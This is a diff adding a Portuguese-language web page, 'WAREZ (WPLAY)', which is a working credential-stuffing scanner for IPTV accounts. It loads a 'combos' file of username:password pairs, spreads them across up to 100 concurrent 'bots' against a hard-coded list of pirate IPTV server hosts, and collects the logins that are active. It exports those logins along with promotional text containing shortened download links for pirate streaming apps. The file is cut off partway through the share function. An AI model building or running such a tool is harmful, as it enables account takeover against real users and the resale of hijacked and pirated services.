@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAREZ (WPLAY)</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap');
+        
+        :root {
+            --dark-green: #003300;
+            --medium-green: #006400;
+            --neon-green: #00ff00;
+            --light-green: #7fff00;
+            --dark-gray: #111;
+            --medium-gray: #222;
+            --light-gray: #333;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: var(--dark-gray);
+            color: white;
+            font-family: 'Roboto', sans-serif;
+            background-image: url('https://img.olx.com.br/images/62/626539171462585.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            padding: 20px 0;
+            border-bottom: 2px solid var(--neon-green);
+        }
+        
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            color: white;
+            text-shadow: 0 0 10px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 0, 0, 0.8);
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: var(--light-green);
+            font-size: 1.2rem;
+        }
+        
+        .card {
+            background-color: rgba(0, 20, 0, 0.8);
+            border: 1px solid var(--medium-green);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
+            animation: scanline 3s linear infinite;
+        }
+        
+        @keyframes scanline {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .card-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-green);
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+        
+        select, input, textarea, button {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+            border: 1px solid var(--medium-green);
+            background-color: rgba(0, 50, 0, 0.5);
+            color: white;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        select:focus, input:focus, textarea:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 5px var(--neon-green);
+        }
+        
+        button {
+            background: linear-gradient(to bottom, var(--medium-green), var(--dark-green));
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button:hover {
+            background: linear-gradient(to bottom, var(--neon-green), var(--medium-green));
+            box-shadow: 0 0 10px var(--neon-green);
+        }
+        
+        button:active {
+            transform: translateY(2px);
+        }
+        
+        .stats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-box {
+            flex: 1;
+            min-width: 150px;
+            background-color: rgba(0, 40, 0, 0.7);
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+            border: 1px solid var(--medium-green);
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: var(--neon-green);
+            margin-top: 5px;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: var(--light-green);
+        }
+        
+        .results {
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 10px;
+            background-color: rgba(0, 20, 0, 0.5);
+            border-radius: 5px;
+            border: 1px solid var(--medium-green);
+        }
+        
+        .result-item {
+            background-color: rgba(0, 30, 0, 0.7);
+            border: 1px solid var(--medium-green);
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 10px;
+            position: relative;
+        }
+        
+        .result-valid {
+            border-left: 5px solid var(--neon-green);
+        }
+        
+        .result-invalid {
+            border-left: 5px solid #ff3333;
+        }
+        
+        .result-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .result-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn-copy {
+            background-color: transparent;
+            border: 1px solid var(--neon-green);
+            color: var(--neon-green);
+            padding: 5px 10px;
+            font-size: 0.8rem;
+            width: auto;
+        }
+        
+        .btn-copy:hover {
+            background-color: var(--neon-green);
+            color: black;
+        }
+        
+        .result-content {
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+        
+        .result-line {
+            margin-bottom: 5px;
+        }
+        
+        .global-actions {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .btn-global {
+            flex: 1;
+        }
+        
+        .btn-save {
+            background: linear-gradient(to bottom, #007700, #004400);
+        }
+        
+        .btn-share {
+            background: linear-gradient(to bottom, #009900, #005500);
+        }
+        
+        .speed-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .speed-control input {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        
+        .speed-control span {
+            color: var(--neon-green);
+            font-weight: bold;
+            min-width: 60px;
+        }
+        
+        .server-list {
+            max-height: 200px;
+            overflow-y: auto;
+            margin-bottom: 15px;
+        }
+        
+        .server-item {
+            padding: 8px;
+            border-bottom: 1px solid var(--medium-green);
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .server-item:hover {
+            background-color: rgba(0, 100, 0, 0.3);
+        }
+        
+        .server-item.selected {
+            background-color: rgba(0, 150, 0, 0.3);
+            border-left: 3px solid var(--neon-green);
+        }
+        
+        .file-input-container {
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+        
+        .file-input-container input[type="file"] {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+        
+        .file-input-label {
+            display: block;
+            padding: 12px;
+            background-color: rgba(0, 50, 0, 0.5);
+            border: 1px dashed var(--medium-green);
+            border-radius: 5px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .file-input-label:hover {
+            background-color: rgba(0, 70, 0, 0.5);
+            border-color: var(--neon-green);
+        }
+        
+        .filename {
+            margin-top: 5px;
+            font-size: 0.9rem;
+            color: var(--light-green);
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .status-active {
+            background-color: var(--neon-green);
+            box-shadow: 0 0 5px var(--neon-green);
+        }
+        
+        .status-inactive {
+            background-color: #ff3333;
+        }
+        
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        .user-counter {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: rgba(0, 40, 0, 0.8);
+            border: 1px solid var(--neon-green);
+            border-radius: 5px;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+            z-index: 1000;
+        }
+        
+        .user-counter-value {
+            font-weight: bold;
+            color: var(--neon-green);
+        }
+        
+        /* Responsividade para tablets */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .subtitle {
+                font-size: 1rem;
+            }
+            
+            .stats {
+                flex-direction: column;
+            }
+            
+            .stat-box {
+                width: 100%;
+            }
+            
+            .global-actions {
+                flex-direction: column;
+            }
+            
+            .card {
+                padding: 15px;
+            }
+            
+            .card-title {
+                font-size: 1.2rem;
+            }
+            
+            .stat-value {
+                font-size: 1.5rem;
+            }
+        }
+        
+        /* Responsividade para celulares em modo retrato */
+        @media (max-width: 480px) {
+            body {
+                background-attachment: scroll;
+            }
+            
+            .container {
+                padding: 10px;
+            }
+            
+            header {
+                padding: 15px 0;
+                margin-bottom: 20px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+                text-shadow: 0 0 8px rgba(0, 0, 0, 0.9), 0 0 16px rgba(0, 0, 0, 0.9);
+            }
+            
+            .subtitle {
+                font-size: 0.9rem;
+            }
+            
+            .card {
+                padding: 12px;
+                margin-bottom: 15px;
+            }
+            
+            .card-title {
+                font-size: 1.1rem;
+                margin-bottom: 10px;
+            }
+            
+            select, input, textarea, button {
+                padding: 10px;
+                margin-bottom: 10px;
+                font-size: 0.9rem;
+            }
+            
+            .stat-box {
+                padding: 12px;
+                margin-bottom: 10px;
+            }
+            
+            .stat-value {
+                font-size: 1.3rem;
+            }
+            
+            .stat-label {
+                font-size: 0.8rem;
+            }
+            
+            .results {
+                max-height: 300px;
+                padding: 8px;
+            }
+            
+            .result-item {
+                padding: 12px;
+                margin-bottom: 8px;
+            }
+            
+            .result-content {
+                font-size: 0.8rem;
+            }
+            
+            .result-line {
+                margin-bottom: 3px;
+            }
+            
+            .btn-copy {
+                padding: 4px 8px;
+                font-size: 0.7rem;
+            }
+            
+            .global-actions {
+                margin-top: 15px;
+                gap: 10px;
+            }
+            
+            .speed-control {
+                margin-bottom: 10px;
+            }
+            
+            .speed-control span {
+                font-size: 0.9rem;
+                min-width: 50px;
+            }
+            
+            .server-list {
+                max-height: 150px;
+                margin-bottom: 10px;
+            }
+            
+            .server-item {
+                padding: 6px;
+                font-size: 0.9rem;
+            }
+            
+            .file-input-label {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+            
+            .filename {
+                font-size: 0.8rem;
+            }
+            
+            .user-counter {
+                bottom: 10px;
+                right: 10px;
+                padding: 8px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>WAREZ (WPLAY)</h1>
+            <div class="subtitle">Scanner de Contas IPTV</div>
+        </header>
+        
+        <div class="card">
+            <h2 class="card-title">CONFIGURAÇÕES</h2>
+            
+            <div class="server-list" id="serverList">
+                <!-- Servidores serão inseridos aqui via JavaScript -->
+            </div>
+            
+            <div class="file-input-container">
+                <div class="file-input-label">
+                    <span id="fileLabel">SELECIONAR ARQUIVO DE COMBOS (USER:PASS)</span>
+                    <div class="filename" id="fileName">Nenhum arquivo selecionado</div>
+                </div>
+                <input type="file" id="comboFile" accept=".txt">
+            </div>
+            
+            <div class="speed-control">
+                <span>BOTS:</span>
+                <input type="number" id="threadCount" min="1" max="100" value="20">
+            </div>
+            
+            <button id="startButton">INICIAR SCAN</button>
+            <button id="stopButton" style="display: none;">PARAR SCAN</button>
+        </div>
+        
+        <div class="card">
+            <h2 class="card-title">ESTATÍSTICAS</h2>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-label">RESULTADOS</div>
+                    <div class="stat-value" id="resultsCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">VELOCIDADE</div>
+                    <div class="stat-value" id="speedCount">0/s</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">COMBOS TESTADOS</div>
+                    <div class="stat-value" id="testedCount">0</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">COMBOS VÁLIDOS</div>
+                    <div class="stat-value" id="validCount">0</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2 class="card-title">RESULTADOS</h2>
+            
+            <div class="results" id="resultsContainer">
+                <!-- Resultados serão inseridos aqui via JavaScript -->
+            </div>
+            
+            <div class="global-actions">
+                <button class="btn-global btn-copy" id="copyAllButton">COPIAR TODOS</button>
+                <button class="btn-global btn-save" id="saveButton">SALVAR RESULTADOS</button>
+                <button class="btn-global btn-share" id="shareButton">COMPARTILHAR</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="user-counter">
+        <span>Usuários online:</span>
+        <span class="user-counter-value" id="userCount">0</span>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Servidores fornecidos
+            const servers = [
+                { id: 1, name: "Servidor 1", url: "http://sdfgerftuysd342545yvsxdt34256g.streamcdn.sbs", provider: "WPlay" },
+                { id: 2, name: "Servidor 2", url: "http://volskraks.com", provider: "WPlay" },
+                { id: 3, name: "Servidor 3", url: "http://flayto.click", provider: "WPlay" },
+                { id: 4, name: "Servidor 4", url: "http://verg45y90hhn7mngn65y0bf5489vxvb.streamcdn.sbs", provider: "WPlay" },
+                { id: 5, name: "Servidor 5", url: "http://rotvapp.servegame.com", provider: "WPlay" },
+                { id: 6, name: "Servidor 6", url: "http://gdhrbti5yrhjr6udb45y9nlo4pc945fvv74h4ivde.xn--24-1lcpaew.com", provider: "WPlay" },
+                { id: 7, name: "Servidor 7", url: "http://xlsdfgvertydthdfdfgh5634dsfdsr4f.ethertwo.sbs", provider: "WPlay" },
+                { id: 8, name: "Servidor 8", url: "http://Turbocdn.sbs", provider: "WPlay" },
+                { id: 9, name: "Servidor 9", url: "http://turbocdn.sbs", provider: "WPlay" },
+                { id: 10, name: "Servidor 10", url: "http://apiceplay.nexus", provider: "WPlay" },
+                { id: 11, name: "Servidor 11", url: "http://mia-68-v6b4tbdstkifdop6.zeroeth.sbs", provider: "WPlay" },
+                { id: 12, name: "Servidor 12", url: "http://wvrtnbgnfghjgtfvprophthrthfashotbsrunbmaq.xn--80aaajydnbfh6blni.com", provider: "WPlay" },
+                { id: 13, name: "Servidor 13", url: "http://peercast.sbs", provider: "WPlay" },
+                { id: 14, name: "Servidor 14", url: "http://odira.sbs", provider: "WPlay" },
+                { id: 15, name: "Servidor 15", url: "http://klog34yrtjrt678we4gdrh4563t6terh.hyperedge.sbs", provider: "WPlay" },
+                { id: 16, name: "Servidor 16", url: "http://79.127.243.237", provider: "WPlay" }
+            ];
+            
+            // Elementos DOM
+            const serverListEl = document.getElementById('serverList');
+            const comboFileEl = document.getElementById('comboFile');
+            const fileNameEl = document.getElementById('fileName');
+            const fileLabelEl = document.getElementById('fileLabel');
+            const threadCountEl = document.getElementById('threadCount');
+            const startButtonEl = document.getElementById('startButton');
+            const stopButtonEl = document.getElementById('stopButton');
+            const resultsCountEl = document.getElementById('resultsCount');
+            const speedCountEl = document.getElementById('speedCount');
+            const testedCountEl = document.getElementById('testedCount');
+            const validCountEl = document.getElementById('validCount');
+            const resultsContainerEl = document.getElementById('resultsContainer');
+            const copyAllButtonEl = document.getElementById('copyAllButton');
+            const saveButtonEl = document.getElementById('saveButton');
+            const shareButtonEl = document.getElementById('shareButton');
+            const userCountEl = document.getElementById('userCount');
+            
+            // Variáveis de estado
+            let selectedServer = null;
+            let combos = [];
+            let results = [];
+            let isScanning = false;
+            let testedCount = 0;
+            let validCount = 0;
+            let startTime = 0;
+            let speedInterval = null;
+            let abortController = null;
+            
+            // Atualizar contador de usuários online
+            function updateUserCount() {
+                fetch('/api/user-count')
+                    .then(response => response.json())
+                    .then(data => {
+                        userCountEl.textContent = data.count;
+                    })
+                    .catch(error => {
+                        console.error('Erro ao obter contador de usuários:', error);
+                    });
+            }
+            
+            // Atualizar contador a cada 30 segundos
+            setInterval(updateUserCount, 30000);
+            updateUserCount(); // Primeira chamada
+            
+            // Inicializar lista de servidores
+            servers.forEach(server => {
+                const serverItem = document.createElement('div');
+                serverItem.className = 'server-item';
+                serverItem.textContent = `${server.name} - ${server.url}`;
+                serverItem.dataset.id = server.id;
+                
+                serverItem.addEventListener('click', () => {
+                    document.querySelectorAll('.server-item').forEach(item => {
+                        item.classList.remove('selected');
+                    });
+                    serverItem.classList.add('selected');
+                    selectedServer = server;
+                });
+                
+                serverListEl.appendChild(serverItem);
+            });
+            
+            // Manipulador de arquivo de combos
+            comboFileEl.addEventListener('change', function(e) {
+                const file = e.target.files[0];
+                if (!file) return;
+                
+                fileNameEl.textContent = file.name;
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    const content = event.target.result;
+                    combos = content.split('\n')
+                        .map(line => line.trim())
+                        .filter(line => line.includes(':'))
+                        .map(line => {
+                            const [user, pass] = line.split(':');
+                            return { user: user.trim(), pass: pass.trim() };
+                        });
+                    
+                    fileLabelEl.innerHTML = `<span class="status-indicator status-active"></span> ${combos.length} COMBOS CARREGADOS`;
+                };
+                reader.readAsText(file);
+            });
+            
+            // Iniciar scan
+            startButtonEl.addEventListener('click', async function() {
+                if (!selectedServer) {
+                    alert('Selecione um servidor primeiro!');
+                    return;
+                }
+                
+                if (combos.length === 0) {
+                    alert('Carregue um arquivo de combos primeiro!');
+                    return;
+                }
+                
+                isScanning = true;
+                startButtonEl.style.display = 'none';
+                stopButtonEl.style.display = 'block';
+                
+                // Resetar contadores
+                testedCount = 0;
+                validCount = 0;
+                results = [];
+                resultsContainerEl.innerHTML = '';
+                updateCounters();
+                
+                // Iniciar medição de velocidade
+                startTime = Date.now();
+                speedInterval = setInterval(updateSpeed, 1000);
+                
+                // Criar controller para abortar requisições
+                abortController = new AbortController();
+                
+                // Número de threads (bots)
+                const threadCount = parseInt(threadCountEl.value) || 20;
+                
+                // Processar combos em lotes
+                const batchSize = Math.ceil(combos.length / threadCount);
+                const promises = [];
+                
+                for (let i = 0; i < threadCount; i++) {
+                    const start = i * batchSize;
+                    const end = Math.min(start + batchSize, combos.length);
+                    const batch = combos.slice(start, end);
+                    
+                    promises.push(processBatch(batch, abortController.signal));
+                }
+                
+                try {
+                    await Promise.all(promises);
+                } catch (error) {
+                    if (error.name !== 'AbortError') {
+                        console.error('Erro durante o scan:', error);
+                    }
+                }
+                
+                // Finalizar scan
+                stopScan();
+            });
+            
+            // Parar scan
+            stopButtonEl.addEventListener('click', function() {
+                if (abortController) {
+                    abortController.abort();
+                }
+                stopScan();
+            });
+            
+            function stopScan() {
+                isScanning = false;
+                startButtonEl.style.display = 'block';
+                stopButtonEl.style.display = 'none';
+                
+                if (speedInterval) {
+                    clearInterval(speedInterval);
+                    speedInterval = null;
+                }
+                
+                updateSpeed();
+            }
+            
+            // Processar um lote de combos
+            async function processBatch(batch, signal) {
+                for (const combo of batch) {
+                    if (!isScanning) break;
+                    
+                    try {
+                        const result = await testCombo(combo.user, combo.pass, selectedServer.url, signal);
+                        testedCount++;
+                        
+                        if (result.valid) {
+                            validCount++;
+                            results.push(result);
+                            addResultToUI(result);
+                        }
+                        
+                        updateCounters();
+                    } catch (error) {
+                        if (error.name !== 'AbortError') {
+                            console.error('Erro testando combo:', error);
+                        }
+                    }
+                }
+            }
+            
+            // Testar um combo individual
+            async function testCombo(username, password, host, signal) {
+                // Usar nossa API como proxy para evitar CORS
+                const apiUrl = '/api/test-server';
+                const body = JSON.stringify({
+                    username: username,
+                    password: password,
+                    host: host
+                });
+                
+                try {
+                    const timeout = setTimeout(() => {
+                        if (signal) signal.onabort();
+                    }, 10000);
+                    
+                    const response = await fetch(apiUrl, {
+                        method: 'POST',
+                        signal: signal,
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: body
+                    });
+                    
+                    clearTimeout(timeout);
+                    
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    
+                    const data = await response.json();
+                    
+                    if (data.user_info && data.user_info.status === 'Active') {
+                        let expirationDate = 'Desconhecida';
+                        let daysRemaining = 'Desconhecido';
+                        
+                        if (data.user_info.exp_date) {
+                            const expTimestamp = parseInt(data.user_info.exp_date) * 1000;
+                            const expDate = new Date(expTimestamp);
+                            expirationDate = expDate.toLocaleDateString('pt-BR');
+                            
+                            // Calcular dias restantes
+                            const now = new Date();
+                            const timeDiff = expTimestamp - now.getTime();
+                            daysRemaining = Math.max(0, Math.ceil(timeDiff / (1000 * 60 * 60 * 24)));
+                        }
+                        
+                        let counts = { live: 0, movies: 0, series: 0, total: 0 };
+                        
+                        if (data.categories) {
+                            counts.total = data.categories.length;
+                            counts.live = data.categories.filter(cat => 
+                                cat.category_name && cat.category_name.toLowerCase().includes('live')).length;
+                            counts.movies = data.categories.filter(cat => 
+                                cat.category_name && cat.category_name.toLowerCase().includes('movie')).length;
+                            counts.series = data.categories.filter(cat => 
+                                cat.category_name && cat.category_name.toLowerCase().includes('series')).length;
+                        }
+                        
+                        // Determinar o provedor baseado no host
+                        const hostname = new URL(host).hostname.replace('www.', '');
+                        let provider = "Desconhecido";
+                        
+                        for (const server of servers) {
+                            if (host.includes(server.url.replace('http://', '').replace('https://', '').split('/')[0])) {
+                                provider = server.provider;
+                                break;
+                            }
+                        }
+                        
+                        return {
+                            valid: true,
+                            username: username,
+                            password: password,
+                            host: host,
+                            status: data.user_info.status,
+                            expiration: expirationDate,
+                            daysRemaining: daysRemaining,
+                            maxConnections: data.user_info.max_connections || 'Desconhecido',
+                            activeConnections: data.user_info.active_cons || 0,
+                            m3uLink: `${host}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`,
+                            counts: counts,
+                            data: data
+                        };
+                    } else {
+                        return {
+                            valid: false,
+                            username: username,
+                            password: password,
+                            host: host,
+                            error: 'Conta inválida ou inativa'
+                        };
+                    }
+                } catch (error) {
+                    return {
+                        valid: false,
+                        username: username,
+                        password: password,
+                        host: host,
+                        error: error.message
+                    };
+                }
+            }
+            
+            // Adicionar resultado à interface
+            function addResultToUI(result) {
+                const resultEl = document.createElement('div');
+                resultEl.className = `result-item ${result.valid ? 'result-valid' : 'result-invalid'}`;
+                
+                if (result.valid) {
+                    resultEl.innerHTML = `
+                        <div class="result-header">
+                            <strong>🟢 WAREZ / WPLAY 🟢</strong>
+                            <div class="result-actions">
+                                <button class="btn-copy" data-user="${result.username}" data-pass="${result.password}">COPIAR</button>
+                            </div>
+                        </div>
+                        <div class="result-content">
+                            <div class="result-line">👤 Usuário ➤ ${result.username}</div>
+                            <div class="result-line">🔐 Senha ➤ ${result.password}</div>
+                            <div class="result-line">📆 Vence em ➤ ${result.expiration}</div>
+                            <div class="result-line">📆 Dias restantes ➤ ${result.daysRemaining}</div>
+                            <div class="result-line">🔗 Conexões ➤ ${result.activeConnections}/${result.maxConnections}</div>
+                            <div class="result-line">✅ Status ➤ ${result.status || 'Active'}</div>
+                            <div class="result-line">📺 Canais: ${result.counts.live} | Filmes: ${result.counts.movies} | Séries: ${result.counts.series}</div>
+                            <div class="result-line">🔗 Host ➤ ${result.host}</div>
+                        </div>
+                    `;
+                } else {
+                    resultEl.innerHTML = `
+                        <div class="result-header">
+                            <strong>🔴 CONTA INVÁLIDA</strong>
+                        </div>
+                        <div class="result-content">
+                            <div class="result-line">👤 Usuário ➤ ${result.username}</div>
+                            <div class="result-line">🔐 Senha ➤ ${result.password}</div>
+                            <div class="result-line">❌ Erro ➤ ${result.error}</div>
+                        </div>
+                    `;
+                }
+                
+                resultsContainerEl.prepend(resultEl);
+                
+                // Adicionar evento de cópia para o botão
+                if (result.valid) {
+                    const copyButton = resultEl.querySelector('.btn-copy');
+                    copyButton.addEventListener('click', function() {
+                        const text = `🟢 WAREZ / WPLAY 🟢
+👤 Usuário ➤ ${result.username}
+🔐 Senha ➤ ${result.password}
+📆 Vence em ➤ ${result.expiration}
+📆 Dias restantes ➤ ${result.daysRemaining}
+🔗 Conexões ➤ ${result.activeConnections}/${result.maxConnections}
+✅ Status ➤ ${result.status || 'Active'}
+📺 EPG: https://tiny.one/epgwplay
+⚙️ DNS STB Wplay App: 15.204.233.167
+⚙️ DNS STB TV Antiga: 149.56.44.24
+⚙️ DNS STB V2: 54.39.88.134
+⚙️ DNS STB V3: 104.194.10.27
+⚙️ DNS STB v3²: 149.56.45.112
+📥 WPlay P2P BinStream Oficial:
+• Link Direto 1: https://tinyurl.com/4f6xdnhu
+• Link Direto 2:  https://cutt.ly/NrxTkDoo
+• Código Downloader: 6968358
+• Site: http://loja.akcceal.click
+• Play Store (M7 Download, XS Control ou Loja SSH) Código: 5146
+• Play Store (ntDown) Código: 44892
+📥 IPTV Purple com CDN P2P
+• Link Direto 1: https://tinyurl.com/5dbxabrh
+• Link Direto 2: https://cutt.ly/yrxTlSWN
+• Código Downloader: 8339451
+• Play Store (M7 Download, XS Control ou Loja SSH) Código: 9617
+• Play Store (ntDown) Código: 54379
+IPTV (Windows)
+📥 Wplay Windows 1
+• Link direto 1: https://tinyurl.com/427jujt9
+• Link direto 2: https://cutt.ly/LrxTWzdu
+📥 Wapp Windows 2
+• Link direto 1: https://tinyurl.com/34nsp7ec
+• Link direto 2: https://cutt.ly/8rxTWP1m
+📥 IPTV (MacOS) 
+• Link direto 1: https://tinyurl.com/k5ssv8px
+• Link direto 2: https://cutt.ly/GrxTWNji
+🛍️ Loja de Aplicativos WPlay:  https://loja.cdnbolt.sbs/
+📺 Android TV: Abra a Play Store e instale o aplicativo "TV Bro". Abra o aplicativo e no campo para digitar coloque o seguinte endereço: https://loja.cdnbolt.sbs/. Assim que entrar dentro da Loja Wplay basta escolher a versão que quiser e baixe gratuitamente.
+📺 TV LG: basta procurar na loja oficial da LG Brasil e fazer a instalação do aplicativo Wapp.
+📺 TV Samsung: basta procurar na loja oficial da Samsung Brasil e fazer a instalação do aplicativo Wapp.
+📺 TV ROKU: basta procurar na loja oficial da ROKU e fazer a instalação do aplicativo Wapp.
+🟢 WAREZ / WPLAY 🟢`;
+                        navigator.clipboard.writeText(text).then(() => {
+                            const originalText = copyButton.textContent;
+                            copyButton.textContent = 'COPIADO!';
+                            setTimeout(() => {
+                                copyButton.textContent = originalText;
+                            }, 2000);
+                        });
+                    });
+                }
+            }
+            
+            // Atualizar contadores
+            function updateCounters() {
+                resultsCountEl.textContent = results.length;
+                testedCountEl.textContent = testedCount;
+                validCountEl.textContent = validCount;
+            }
+            
+            // Atualizar velocidade
+            function updateSpeed() {
+                const elapsedSeconds = (Date.now() - startTime) / 1000;
+                const speed = elapsedSeconds > 0 ? (testedCount / elapsedSeconds).toFixed(1) : 0;
+                speedCountEl.textContent = `${speed}/s`;
+            }
+            
+            // Copiar todos os resultados
+            copyAllButtonEl.addEventListener('click', function() {
+                if (results.length === 0) {
+                    alert('Nenhum resultado válido para copiar!');
+                    return;
+                }
+                
+                let text = '';
+                results.forEach(result => {
+                    text += `🟢 WAREZ / WPLAY 🟢
+👤 Usuário ➤ ${result.username}
+🔐 Senha ➤ ${result.password}
+📆 Vence em ➤ ${result.expiration}
+📆 Dias restantes ➤ ${result.daysRemaining}
+🔗 Conexões ➤ ${result.activeConnections}/${result.maxConnections}
+✅ Status ➤ ${result.status || 'Active'}
+📺 EPG: https://tiny.one/epgwplay
+⚙️ DNS STB Wplay App: 15.204.233.167
+⚙️ DNS STB TV Antiga: 149.56.44.24
+⚙️ DNS STB V2: 54.39.88.134
+⚙️ DNS STB V3: 104.194.10.27
+⚙️ DNS STB v3²: 149.56.45.112
+📥 WPlay P2P BinStream Oficial:
+• Link Direto 1: https://tinyurl.com/4f6xdnhu
+• Link Direto 2:  https://cutt.ly/NrxTkDoo
+• Código Downloader: 6968358
+• Site: http://loja.akcceal.click
+• Play Store (M7 Download, XS Control ou Loja SSH) Código: 5146
+• Play Store (ntDown) Código: 44892
+📥 IPTV Purple com CDN P2P
+• Link Direto 1: https://tinyurl.com/5dbxabrh
+• Link Direto 2: https://cutt.ly/yrxTlSWN
+• Código Downloader: 8339451
+• Play Store (M7 Download, XS Control ou Loja SSH) Código: 9617
+• Play Store (ntDown) Código: 54379
+IPTV (Windows)
+📥 Wplay Windows 1
+• Link direto 1: https://tinyurl.com/427jujt9
+• Link direto 2: https://cutt.ly/LrxTWzdu
+📥 Wapp Windows 2
+• Link direto 1: https://tinyurl.com/34nsp7ec
+• Link direto 2: https://cutt.ly/8rxTWP1m
+📥 IPTV (MacOS) 
+• Link direto 1: https://tinyurl.com/k5ssv8px
+• Link direto 2: https://cutt.ly/GrxTWNji
+🛍️ Loja de Aplicativos WPlay:  https://loja.cdnbolt.sbs/
+📺 Android TV: Abra a Play Store e instale o aplicativo "TV Bro". Abra o aplicativo e no campo para digitar coloque o seguinte endereço: https://loja.cdnbolt.sbs/. Assim que entrar dentro da Loja Wplay basta escolher a versão que quiser e baixe gratuitamente.
+📺 TV LG: basta procurar na loja oficial da LG Brasil e fazer a instalação do aplicativo Wapp.
+📺 TV Samsung: basta procurar na loja oficial da Samsung Brasil e fazer a instalação do aplicativo Wapp.
+📺 TV ROKU: basta procurar na loja oficial da ROKU e fazer a instalação do aplicativo Wapp.
+🟢 WAREZ / WPLAY 🟢
+───────────────────────────────
+`;
+                });
+                
+                navigator.clipboard.writeText(text).then(() => {
+                    const originalText = copyAllButtonEl.textContent;
+                    copyAllButtonEl.textContent = 'TUDO COPIADO!';
+                    setTimeout(() => {
+                        copyAllButtonEl.textContent = originalText;
+                    }, 2000);
+                });
+            });
+            
+            // Salvar resultados em arquivo
+            saveButtonEl.addEventListener('click', function() {
+                if (results.length === 0) {
+                    alert('Nenhum resultado válido para salvar!');
+                    return;
+                }
+                
+                let text = '';
+                results.forEach(result => {
+                    text += `Usuário: ${result.username} | Senha: ${result.password} | Expira: ${result.expiration} | Dias: ${result.daysRemaining} | Conexões: ${result.activeConnections}/${result.maxConnections}\n`;
+                });
+                
+                const blob = new Blob([text], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'WPLAY_LOGINS.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            });
+            
+            // Compartilhar resultados
+            shareButtonEl.addEventListener('click', function() {
